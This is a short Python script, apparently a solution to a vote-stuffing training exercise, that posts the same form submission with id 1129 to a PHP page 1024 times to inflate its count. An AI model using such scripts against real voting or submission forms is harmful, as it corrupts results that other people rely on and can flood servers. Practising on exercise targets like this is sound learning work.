#!/usr/bin/python3
import requests
url = "http://158.69.76.135/level0.php"
id = 1129

for req in range(1024):
    requests.post(url, allow_redirects=False, data={
        'id': id,
        'holdthedoor': "Submit"
    })
    print("request number {} has been sent to {}".format(req, url))
